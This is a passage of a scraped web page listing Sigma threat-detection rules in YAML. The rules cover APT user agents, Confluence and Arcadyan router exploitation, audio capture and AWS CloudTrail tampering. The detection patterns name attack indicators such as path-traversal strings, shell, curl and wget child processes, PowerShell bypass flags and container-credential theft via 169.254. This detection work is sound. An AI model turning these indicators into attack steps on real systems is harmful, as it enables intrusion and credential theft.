.NET4.0C; .NET4.0E; InfoPath.2)' # - 'Mozilla/4.0 (compatible; RMS)' # Attacks on industrial enterprises using RMS and TeamViewer - 'Mozilla/4.0 (compatible; MSIE 6.0; DynGate)' # Attacks on industrial enterprises using RMS and TeamViewer - 'O/9.27 (W; U; Z)' # Cmstar - 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; Trident/5.0*' # KerrDown UA - 'Mozilla/5.0 (Windows NT 9; *' # Suspicious 'Windows NT 9' user agent - used by APT33 malware in 2018 - 'hots scot' # Unknown iOS zero-day implant - 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT)' # - 'Mozilla/5.0 (Windows NT 6.1; WOW64) Chrome/28.0.1500.95 Safari/537.36' # Hidden Cobra malware - 'Mozilla/5.0 (Windows NT 6.2; Win32; rv:47.0)' # Strong Pity loader - 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1;' # Mustang Panda - 'Mozilla/5.0 (X11; Linux i686; rv:22.0) Firefox/22.0' # BackdoorDiplomacy - 'Mozilla/5.0 Chrome/72.0.3626.109 Safari/537.36' # SideWalk malware used by Sparkling Goblin - 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:FTS_06) Gecko/22.36.35.06 Firefox/2.0' # LitePower stager used by WRITE condition: selection fields: - ClientIP - c-uri - c-useragent falsepositives: - Old browsers level: high tags: - attack.command_and_control - attack.t1071.001 
<li><a href="#">title:APT29 id: 033fe7d6-66d1-4240-ac6b-28908009c71f status: test description: This method detects a suspicious PowerShell command line combination as used by APT29 in a campaign against U.S. think tanks. author: Florian Roth references: - - date: 2018/12/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - '-noni' - '-ep' - 'bypass' - '$' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.g0016 - attack.t1059.001 
<li><a href="#">title:APT40 Dropbox Tool User Agent id: 5ba715b6-71b7-44fd-8245-f66893e81b3d status: test description: Detects suspicious user agent string of APT40 Dropbox tool author: Thomas Patzke references: - Internal research from Florian Roth date: 2019/11/12 modified: 2021/11/27 logsource: category: proxy detection: selection: c-useragent: 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36' r-dns: 'api.dropbox.com' condition: selection fields: - c-ip - c-uri falsepositives: - Old browsers level: high tags: - attack.command_and_control - attack.t1071.001 - attack.exfiltration - attack.t1567.002 
<li><a href="#">title:Arbitrary Shell Command Execution Via Settingcontent-Ms id: 24de4f3b-804c-4165-b442-5a06a2302c7e description: The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create "shortcuts" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries. status: experimental author: Sreeman date: 2020/03/13 modified: 2022/04/14 references: - tags: - attack.t1204 - attack.t1566.001 - attack.execution - attack.initial_access logsource: category: process_creation product: windows detection: selection: CommandLine|contains: '.SettingContent-ms' filter: CommandLine|contains: 'immersivecontrolpanel' condition: selection and not filter falsepositives: - Unknown fields: - ParentProcess - CommandLine - ParentCommandLine level: medium 
<li><a href="#">title:Arcadyan Router Exploitations id: f0500377-bc70-425d-ac8c-e956cd906871 status: experimental description: Detects exploitation of vulnerabilities in Arcadyan routers as reported in CVE-2021-20090 and CVE-2021-20091. references: - - - author: Bhabesh Raj date: 2021/08/24 modified: 2021/08/25 falsepositives: - Unknown level: critical tags: - attack.initial_access - attack.t1190 - cve.2021.20090 - cve.2021.20091 logsource: category: webserver detection: path_traversal: # CVE-2021-20090 (Bypass Auth: Path Traversal) c-uri|contains: '..%2f' config_file_inj: c-uri|contains|all: # Chaining of CVE-2021-20090 (Bypass Auth) and CVE-2021-20091 (Config File Injection) - '..%2f' - 'apply_abstract.cgi' noauth_list: c-uri|contains: - '/images/' - '/js/' - '/css/' - '/setup_top_login.htm' - '/login.html' - '/loginerror.html' - '/loginexclude.html' - '/loginlock.html' condition: (path_traversal or config_file_inj) and noauth_list 
<li><a href="#">title:Atbroker Registry Change id: 9577edbb-851f-4243-8c91-1d5b50c1a39b description: Detects creation/modification of Assisitive Technology applications and persistence with usage of ATs status: experimental author: Mateusz Wydra, oscd.community references: - - date: 2020/10/13 modified: 2021/05/24 tags: - attack.defense_evasion - attack.t1218 - attack.persistence - attack.t1547 logsource: category: registry_event product: windows detection: creation: TargetObject|contains: 'Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs' persistence: TargetObject|contains: 'Software\Microsoft\Windows NT\CurrentVersion\Accessibility\Configuration' condition: creation or persistence falsepositives: - Creation of non-default, legitimate AT. level: high 
<li><a href="#">title:Atera Agent Installation id: 87261fb2-69d0-42fe-b9de-88c6b5f65a43 status: experimental description: Detects successful installation of Atera Remote Monitoring & Management (RMM) agent as recently found to be used by Conti operators references: - date: 2021/09/01 modified: 2021/10/13 author: Bhabesh Raj level: high logsource: service: application product: windows tags: - attack.t1219 detection: selection: EventID: 1033 Provider_Name: MsiInstaller Message|contains: AteraAgent condition: selection falsepositives: - Legitimate Atera agent installation 
<li><a href="#">title:Atlassian Confluence CVE-2021-26084 id: 245f92e3-c4da-45f1-9070-bc552e06db11 status: experimental description: Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2021-26084 author: Bhabesh Raj date: 2021/09/08 references: - - - tags: - attack.initial_access - attack.execution - attack.t1190 - attack.t1059 logsource: category: process_creation product: windows detection: selection: # Monitor suspicious child processes spawned by Confluence ParentImage|endswith: '\Atlassian\Confluence\jre\bin\java.exe' CommandLine|contains: - 'cmd /c' - 'cmd /k' - 'powershell' - 'certutil' - 'curl' - 'whoami' - 'ipconfig' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Atlassian Confluence CVE-2022-26134 id: 7fb14105-530e-4e2e-8cfb-99f7d8700b66 status: experimental description: Detects spawning of suspicious child processes by Atlassian Confluence server which may indicate successful exploitation of CVE-2022-26134 author: Nasreddine Bencherchali date: 2022/06/03 related: - id: 245f92e3-c4da-45f1-9070-bc552e06db11 type: derived references: - tags: - attack.initial_access - attack.execution - attack.t1190 - attack.t1059 - cve.2022.26134 logsource: category: process_creation product: linux detection: selection: # Monitor suspicious child processes spawned by Confluence ParentImage|startswith: '/opt/atlassian/confluence/' ParentImage|endswith: '/java' CommandLine|contains: - '/bin/sh' - 'bash' - 'dash' - 'ksh' - 'zsh' - 'csh' - 'fish' - 'curl' - 'wget' - 'python' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Audio Capture id: a7af2487-9c2f-42e4-9bb9-ff961f0561d5 description: Detects attempts to record audio with arecord utility #the actual binary that arecord is using and that has to be monitored is /usr/bin/aplay author: 'Pawel Mazur' status: experimental date: 2021/09/04 references: - - - logsource: product: linux service: auditd detection: selection: type: EXECVE a0: arecord a1: '-vv' a2: '-fdat' condition: selection tags: - attack.collection - attack.t1123 falsepositives: - Unknown level: low 
<li><a href="#">title:Audio Capture via PowerShell id: 932fb0d8-692b-4b0f-a26e-5643a50fe7d6 status: test description: Detects audio capture via PowerShell Cmdlet. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'WindowsAudioDevice-Powershell-Cmdlet' condition: selection falsepositives: - Legitimate audio capture by legitimate user. level: medium tags: - attack.collection - attack.t1123 
<li><a href="#">title:Audio Capture via SoundRecorder id: 83865853-59aa-449e-9600-74b9d89a6d6e status: test description: Detect attacker collecting audio via SoundRecorder application. author: E.M. Anhaus (originally from Atomic Blue Detections, Endgame), oscd.community references: - - date: 2019/10/24 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\SoundRecorder.exe' CommandLine|contains: '/FILE' condition: selection falsepositives: - Legitimate audio capture by legitimate user. level: medium tags: - attack.collection - attack.t1123 
<li><a href="#">title:Audit CVE Event id: 48d91a3a-2363-43ba-a456-ca71ac3da5c2 status: experimental description: Detects events generated by Windows to indicate the exploitation of a known vulnerability (e.g. CVE-2020-0601) references: - - - - - tags: - attack.execution - attack.t1203 - attack.privilege_escalation - attack.t1068 - attack.defense_evasion - attack.t1211 - attack.credential_access - attack.t1212 - attack.lateral_movement - attack.t1210 - attack.impact - attack.t1499.004 author: Florian Roth date: 2020/01/15 modified: 2021/10/13 logsource: product: windows service: application detection: selection: Provider_Name: 'Microsoft-Windows-Audit-CVE' condition: selection falsepositives: - Unknown level: critical 
<li><a href="#">title:Auditing Configuration Changes on Linux Host id: 977ef627-4539-4875-adf4-ed8f780c4922 status: test description: Detect changes in auditd configuration files author: Mikhail Larin, oscd.community references: - - self experience date: 2019/10/25 modified: 2021/11/27 logsource: product: linux service: auditd detection: selection: type: PATH name: - /etc/audit/* - /etc/libaudit.conf - /etc/audisp/* condition: selection fields: - exe - comm - key falsepositives: - Legitimate administrative activity level: high tags: - attack.defense_evasion - attack.t1562.006 
<li><a href="#">title:Automated Collection Bookmarks Using Get-ChildItem PowerShell id: e0565f5d-d420-4e02-8a68-ac00d864f9cf status: experimental author: frack113 date: 2021/12/13 description: | Adversaries may enumerate browser bookmarks to learn more about compromised hosts. Browser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure. references: - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Get-ChildItem' - ' -Recurse ' - ' -Path ' - ' -Filter Bookmarks' - ' -ErrorAction SilentlyContinue' - ' -Force' condition: selection falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1217 
<li><a href="#">title:Automated Collection Command PowerShell id: c1dda054-d638-4c16-afc8-53e007f3fbc5 status: experimental author: frack113 date: 2021/07/28 modified: 2021/12/02 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. references: - tags: - attack.collection - attack.t1119 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection_ext: ScriptBlockText|contains: - '.doc' - '.docx' - '.xls' - '.xlsx' - '.ppt' - '.pptx' - '.rtf' - '.pdf' - '.txt' selection_cmd: ScriptBlockText|contains|all: - 'Get-ChildItem' - ' -Recurse ' - ' -Include ' condition: all of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:Automated Collection Command Prompt id: f576a613-2392-4067-9d1a-9345fb58d8d1 status: experimental author: frack113 date: 2021/07/28 description: Once established within a system or network, an adversary may use automated techniques for collecting internal data. references: - - logsource: category: process_creation product: windows detection: selection_ext: CommandLine|contains: - '.doc' - '.docx' - '.xls' - '.xlsx' - '.ppt' - '.pptx' - '.rtf' - '.pdf' - '.txt' selection_dir: CommandLine|contains|all: - 'dir ' - ' /b ' - ' /s ' selection_findstr: OriginalFileName: FINDSTR.EXE CommandLine|contains: - ' /e ' - ' /si ' condition: selection_ext and (selection_dir or selection_findstr) falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1119 - attack.credential_access - attack.t1552.001 
<li><a href="#">title:AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl id: 074e0ded-6ced-4ebd-8b4d-53f55908119d description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed) status: experimental references: - author: Julia Fomina, oscd.community date: 2020/10/06 modified: 2021/09/19 tags: - attack.defense_evasion - attack.t1216 logsource: category: process_creation product: windows detection: contains_format_pretty_arg: CommandLine|contains: - 'format:pretty' - 'format:"pretty"' - 'format:"text"' - 'format:text' image_from_system_folder: Image|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' contains_winrm: CommandLine|contains: 'winrm' condition: contains_winrm and (contains_format_pretty_arg and not image_from_system_folder) level: medium falsepositives: - Unlikely 
<li><a href="#">title:AWL Bypass with Winrm.vbs and Malicious WsmPty.xsl/WsmTxt.xsl id: d353dac0-1b41-46c2-820c-d7d2561fc6ed related: - id: 074e0ded-6ced-4ebd-8b4d-53f55908119 type: derived description: Detects execution of attacker-controlled WsmPty.xsl or WsmTxt.xsl via winrm.vbs and copied cscript.exe (can be renamed) status: experimental references: - author: Julia Fomina, oscd.community date: 2020/10/06 modified: 2021/09/19 tags: - attack.defense_evasion - attack.t1216 logsource: product: windows category: file_event detection: system_files: TargetFilename|endswith: - 'WsmPty.xsl' - 'WsmTxt.xsl' in_system_folder: TargetFilename|startswith: - 'C:\Windows\System32\' - 'C:\Windows\SysWOW64\' condition: system_files and not in_system_folder level: medium falsepositives: - Unlikely 
<li><a href="#">title:AWS Attached Malicious Lambda Layer id: 97fbabf8-8e1b-47a2-b7d5-a418d2b95e3d description: Detects when an user attached a Lambda layer to an existing function to override a library that is in use by the function, where their malicious code could utilize the function's IAM role for AWS API calls. This would give an adversary access to the privileges associated with the Lambda service role that is attached to that function. author: Austin Songer status: experimental date: 2021/09/23 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: lambda.amazonaws.com eventName|startswith: UpdateFunctionConfiguration condition: selection level: medium tags: - attack.privilege_escalation falsepositives: - Lambda Layer being attached may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - Lambda Layer being attached from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS CloudTrail Important Change id: 4db60cc0-36fb-42b7-9b58-a5b53019fb74 status: experimental description: Detects disabling, deleting and updating of a Trail author: vitaliy0x1 date: 2020/01/21 modified: 2021/08/09 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: cloudtrail.amazonaws.com eventName: - StopLogging - UpdateTrail - DeleteTrail condition: selection_source falsepositives: - Valid change in a Trail level: medium tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:AWS Config Disabling Channel/Recorder id: 07330162-dba1-4746-8121-a9647d49d297 status: experimental description: Detects AWS Config Service disabling author: vitaliy0x1 date: 2020/01/21 modified: 2021/08/09 logsource: product: aws service: cloudtrail detection: selection_source: eventSource: config.amazonaws.com eventName: - DeleteDeliveryChannel - StopConfigurationRecorder condition: selection_source falsepositives: - Valid change in AWS Config Service level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:AWS EC2 Disable EBS Encryption id: 16124c2d-e40b-4fcc-8f2c-5ab7870a2223 status: stable description: Identifies disabling of default Amazon Elastic Block Store (EBS) encryption in the current region. Disabling default encryption does not change the encryption status of your existing volumes. author: Sittikorn S date: 2021/06/29 modified: 2021/08/20 references: - tags: - attack.impact - attack.t1486 - attack.t1565 logsource: product: aws service: cloudtrail detection: selection: eventSource: ec2.amazonaws.com eventName: DisableEbsEncryptionByDefault condition: selection falsepositives: - System Administrator Activities - DEV, UAT, SAT environment. You should apply this rule with PROD account only. level: medium 
<li><a href="#">title:AWS EC2 Download Userdata id: 26ff4080-194e-47e7-9889-ef7602efed0c status: experimental description: Detects bulk downloading of User Data associated with AWS EC2 instances. Instance User Data may include installation scripts and hard-coded secrets for deployment. author: faloker date: 2020/02/11 modified: 2021/08/20 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: ec2.amazonaws.com requestParameters.attribute: userData eventName: DescribeInstanceAttribute timeframe: 30m condition: selection_source falsepositives: - Assets management software like device42 level: medium tags: - attack.exfiltration - attack.t1020 
<li><a href="#">title:AWS EC2 Startup Shell Script Change id: 1ab3c5ed-5baf-417b-bb6b-78ca33f6c3df status: experimental description: Detects changes to the EC2 instance startup script. The shell script will be executed as root/SYSTEM every time the specific instances are booted up. author: faloker date: 2020/02/12 modified: 2022/06/07 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: ec2.amazonaws.com requestParameters.attribute: 'userData' eventName: ModifyInstanceAttribute condition: selection_source falsepositives: - Valid changes to the startup script level: high tags: - attack.execution - attack.t1059.001 - attack.t1059.003 - attack.t1059.004 
<li><a href="#">title:AWS EC2 VM Export Failure id: 54b9a76a-3c71-4673-b4b3-2edb4566ea7b status: experimental description: An attempt to export an AWS EC2 instance has been detected. A VM Export might indicate an attempt to extract information from an instance. author: Diogo Braz date: 2020/04/16 modified: 2021/08/20 references: - logsource: product: aws service: cloudtrail detection: selection: eventName: 'CreateInstanceExportTask' eventSource: 'ec2.amazonaws.com' filter1: errorMessage: '*' filter2: errorCode: '*' filter3: responseElements|contains: 'Failure' condition: selection and (filter1 or filter2 or filter3) level: low tags: - attack.collection - attack.t1005 - attack.exfiltration - attack.t1537 
<li><a href="#">title:AWS ECS Backdoor Task Definition id: b94bf91e-c2bf-4047-9c43-c6810f43baad status: experimental description: Detects when an Elastic Container Service (ECS) Task Definition has been modified and run. This can indicate an adversary adding a backdoor to establish persistence or escalate privileges. This rule is based on examining events created upon execution of Rhino Security Lab's Pacu in a lab environment. author: Darin Smith date: 2022/06/07 references: - - - logsource: product: aws service: cloudtrail detection: selection: eventSource: ecs.amazonaws.com eventName: - DescribeTaskDefinition - RegisterTaskDefinition - RunTask requestParameters.containerDefinitions.command|contains|all: - '169.254' - '$AWS_CONTAINER_CREDENTIALS' condition: selection level: medium tags: - attack.persistence - attack.t1525 falsepositives: - Task Definition being modified to request credentials from the Task Metadata Service for valid reasons 
<li><a href="#">title:AWS EFS Fileshare Modified or Deleted id: 25cb1ba1-8a19-4a23-a198-d252664c8cef status: experimental description: Detects when a EFS Fileshare is modified or deleted. You can't delete a file system that is in use. If the file system has any mount targets, the adversary must first delete them, so deletion of a mount will occur before deletion of a fileshare. author: Austin Songer @austinsonger date: 2021/08/15 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticfilesystem.amazonaws.com eventName: DeleteFileSystem condition: selection falsepositives: - Unknown level: medium tags: - attack.impact 
<li><a href="#">title:AWS EFS Fileshare Mount Modified or Deleted id: 6a7ba45c-63d8-473e-9736-2eaabff79964 status: experimental description: Detects when a EFS Fileshare Mount is modified or deleted. An adversary breaking any file system using the mount target that is being deleted, which might disrupt instances or applications using those mounts. author: Austin Songer @austinsonger date: 2021/08/15 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticfilesystem.amazonaws.com eventName: DeleteMountTarget condition: selection falsepositives: - Unknown level: medium tags: - attack.impact - attack.t1485 
<li><a href="#">title:AWS EKS Cluster Created or Deleted id: 33d50d03-20ec-4b74-a74e-1e65a38af1c0 description: Identifies when an EKS cluster is created or deleted. author: Austin Songer status: experimental date: 2021/08/16 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: eks.amazonaws.com eventName: - CreateCluster - DeleteCluster condition: selection level: low tags: - attack.impact - attack.t1485 falsepositives: - EKS Cluster being created or deleted may be performed by a system administrator. - Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - EKS Cluster created or deleted from unfamiliar users should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS ElastiCache Security Group Created id: 4ae68615-866f-4304-b24b-ba048dfa5ca7 description: Detects when an ElastiCache security group has been created. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/19 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticache.amazonaws.com eventName: 'CreateCacheSecurityGroup' condition: selection level: low tags: - attack.persistence - attack.t1136 - attack.t1136.003 falsepositives: - A ElastiCache security group may be created by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security group creations from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS ElastiCache Security Group Modified or Deleted id: 7c797da2-9cf2-4523-ba64-33b06339f0cc description: Identifies when an ElastiCache security group has been modified or deleted. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/19 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: elasticache.amazonaws.com eventName: - 'DeleteCacheSecurityGroup' - 'AuthorizeCacheSecurityGroupIngress' - 'RevokeCacheSecurityGroupIngress' - 'AuthorizeCacheSecurityGroupEgress' - 'RevokeCacheSecurityGroupEgress' condition: selection level: low tags: - attack.impact - attack.t1531 falsepositives: - A ElastiCache security group deletion may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Security Group deletions from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS Glue Development Endpoint Activity id: 4990c2e3-f4b8-45e3-bc3c-30b14ff0ed26 description: Detects possible suspicious glue development endpoint activity. author: Austin Songer @austinsonger status: experimental date: 2021/10/03 modified: 2021/10/13 references: - - logsource: product: aws service: cloudtrail detection: selection1: eventSource: glue.amazonaws.com eventName: CreateDevEndpoint selection2: eventSource: glue.amazonaws.com eventName: DeleteDevEndpoint selection3: eventSource: glue.amazonaws.com eventName: UpdateDevEndpoint condition: selection1 or selection2 or selection3 level: low tags: - attack.privilege_escalation falsepositives: - Glue Development Endpoint Activity may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS GuardDuty Important Change id: 6e61ee20-ce00-4f8d-8aee-bedd8216f7e3 status: experimental description: Detects updates of the GuardDuty list of trusted IPs, perhaps to disable security alerts against malicious IPs. author: faloker date: 2020/02/11 modified: 2021/08/09 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: guardduty.amazonaws.com eventName: CreateIPSet condition: selection_source falsepositives: - Valid change in the GuardDuty (e.g. to ignore internal scanners) level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:AWS IAM Backdoor Users Keys id: 0a5177f4-6ca9-44c2-aacf-d3f3d8b6e4d2 status: experimental description: Detects AWS API key creation for a user by another user. Backdoored users can be used to obtain persistence in the AWS environment. Also with this alert, you can detect a flow of AWS keys in your org. author: faloker date: 2020/02/12 modified: 2021/08/20 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: iam.amazonaws.com eventName: CreateAccessKey filter: userIdentity.arn|contains: responseElements.accessKey.userName condition: selection_source and not filter fields: - userIdentity.arn - responseElements.accessKey.userName - errorCode - errorMessage falsepositives: - Adding user keys to their own accounts (the filter cannot cover all possible variants of user naming) - AWS API keys legitimate exchange workflows level: medium tags: - attack.persistence - attack.t1098 
<li><a href="#">title:AWS Lambda Function Created or Invoked id: d914951b-52c8-485f-875e-86abab710c0b description: Detects when an user creates or invokes a lambda function. author: Austin Songer @austinsonger status: experimental date: 2021/10/03 modified: 2021/10/13 references: - logsource: product: aws service: cloudtrail detection: selection1: eventSource: lambda.amazonaws.com eventName: CreateFunction selection2: eventSource: lambda.amazonaws.com eventName: Invoke condition: selection1 or selection2 level: low tags: - attack.privilege_escalation - attack.t1078 falsepositives: - Lambda Function created or invoked may be performed by a system administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS Macie Evasion id: 91f6a16c-ef71-437a-99ac-0b070e3ad221 status: experimental description: Detects evade to Macie detection. author: Sittikorn S date: 2021/07/06 references: - tags: - attack.defense_evasion - attack.t1562.001 logsource: product: aws service: cloudtrail detection: selection: eventName: - 'ArchiveFindings' - 'CreateFindingsFilter' - 'DeleteMember' - 'DisassociateFromMasterAccount' - 'DisassociateMember' - 'DisableMacie' - 'DisableOrganizationAdminAccount' - 'UpdateFindingsFilter' - 'UpdateMacieSession' - 'UpdateMemberSession' - 'UpdateClassificationJob' timeframe: 10m condition: selection fields: - sourceIPAddress - userIdentity.arn falsepositives: - System or Network administrator behaviors level: medium 
<li><a href="#">title:AWS RDS Master Password Change id: 8a63cdd4-6207-414a-85bc-7e032bd3c1a2 status: experimental description: Detects the change of database master password. It may be a part of data exfiltration. author: faloker date: 2020/02/12 modified: 2021/08/20 references: - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: rds.amazonaws.com responseElements.pendingModifiedValues.masterUserPassword: '*' eventName: ModifyDBInstance condition: selection_source falsepositives: - Benign changes to a db instance level: medium tags: - attack.exfiltration - attack.t1020 
<li><a href="#">title:AWS Root Credentials id: 8ad1600d-e9dc-4251-b0ee-a65268f29add status: experimental description: Detects AWS root account usage author: vitaliy0x1 date: 2020/01/21 modified: 2021/08/09 references: - logsource: product: aws service: cloudtrail detection: selection_usertype: userIdentity.type: Root selection_eventtype: eventType: AwsServiceEvent condition: selection_usertype and not selection_eventtype falsepositives: - AWS Tasks That Require AWS Account Root User Credentials level: medium tags: - attack.privilege_escalation - attack.t1078.004 
<li><a href="#">title:AWS Route 53 Domain Transfer Lock Disabled id: 3940b5f1-3f46-44aa-b746-ebe615b879e0 description: Detects when a transfer lock was removed from a Route 53 domain. It is recommended to refrain from performing this action unless intending to transfer the domain to a different registrar. author: Elastic, Austin Songer @austinsonger status: experimental date: 2021/07/22 references: - - - logsource: product: aws service: cloudtrail detection: selection: eventSource: route53.amazonaws.com eventName: DisableDomainTransferLock condition: selection level: low tags: - attack.persistence - attack.credential_access - attack.t1098 falsepositives: - A domain transfer lock may be disabled by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Activity from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS Route 53 Domain Transferred to Another Account id: b056de1a-6e6e-4e40-a67e-97c9808cf41b description: Detects when a request has been made to transfer a Route 53 domain to another AWS account. author: Elastic, Austin Songer @austinsonger status: experimental date: 2021/07/22 references: - logsource: product: aws service: cloudtrail detection: selection: eventSource: route53.amazonaws.com eventName: TransferDomainToAnotherAwsAccount condition: selection tags: - attack.persistence - attack.credential_access - attack.t1098 falsepositives: - A domain may be transferred to another AWS account by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. Domain transfers from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. level: low 
<li><a href="#">title:AWS S3 Data Management Tampering id: 78b3756a-7804-4ef7-8555-7b9024a02e2d description: Detects when a user tampers with S3 data management in Amazon Web Services. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/19 references: - - - - - - - logsource: product: aws service: cloudtrail detection: selection: eventSource: s3.amazonaws.com eventName: - PutBucketLogging - PutBucketWebsite - PutEncryptionConfiguration - PutLifecycleConfiguration - PutReplicationConfiguration - ReplicateObject - RestoreObject condition: selection level: low tags: - attack.exfiltration - attack.t1537 falsepositives: - A S3 configuration change may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. S3 configuration change from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
<li><a href="#">title:AWS SecurityHub Findings Evasion id: a607e1fe-74bf-4440-a3ec-b059b9103157 status: stable description: Detects the modification of the findings on SecurityHub. author: Sittikorn S date: 2021/06/28 references: - tags: - attack.defense_evasion - attack.t1562 logsource: product: aws service: cloudtrail detection: selection: eventSource: securityhub.amazonaws.com eventName: - 'BatchUpdateFindings' - 'DeleteInsight' - 'UpdateFindings' - 'UpdateInsight' condition: selection fields: - sourceIPAddress - userIdentity.arn falsepositives: - System or Network administrator behaviors - DEV, UAT, SAT environment. You should apply this rule with PROD environment only. level: high 
<li><a href="#">title:AWS Snapshot Backup Exfiltration id: abae8fec-57bd-4f87-aff6-6e3db989843d status: test description: Detects the modification of an EC2 snapshot's permissions to enable access from another account author: Darin Smith date: 2021/05/17 modified: 2021/08/19 references: - - logsource: product: aws service: cloudtrail detection: selection_source: eventSource: ec2.amazonaws.com eventName: ModifySnapshotAttribute condition: selection_source falsepositives: - Valid change to a snapshot's permissions level: medium tags: - attack.exfiltration - attack.t1537 
<li><a href="#">title:AWS STS AssumeRole Misuse id: 905d389b-b853-46d0-9d3d-dea0d3a3cd49 description: Identifies the suspicious use of AssumeRole. Attackers could move laterally and escalate privileges. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 modified: 2021/08/20 references: - - logsource: product: aws service: cloudtrail detection: selection: userIdentity.type: AssumedRole userIdentity.sessionContext.sessionIssuer.type: Role condition: selection level: low tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1548 - attack.t1550 - attack.t1550.001 falsepositives: - AssumeRole may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. - AssumeRole from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. - Automated processes that uses Terraform may lead to false positives. 
<li><a href="#">title:AWS STS GetSessionToken Misuse id: b45ab1d2-712f-4f01-a751-df3826969807 description: Identifies the suspicious use of GetSessionToken. Tokens could be created and used by attackers to move laterally and escalate privileges. author: Austin Songer @austinsonger status: experimental date: 2021/07/24 references: - - logsource: product: aws service: cloudtrail detection: selection: eventSource: sts.amazonaws.com eventName: GetSessionToken userIdentity.type: IAMUser condition: selection level: low tags: - attack.lateral_movement - attack.privilege_escalation - attack.t1548 - attack.t1550 - attack.t1550.001 falsepositives: - GetSessionToken may be done by a system or network administrator. Verify whether the user identity, user agent, and/or hostname should be making changes in your environment. GetSessionToken from unfamiliar users or hosts should be investigated. If known behavior is causing false positives, it can be exempted from the rule. 
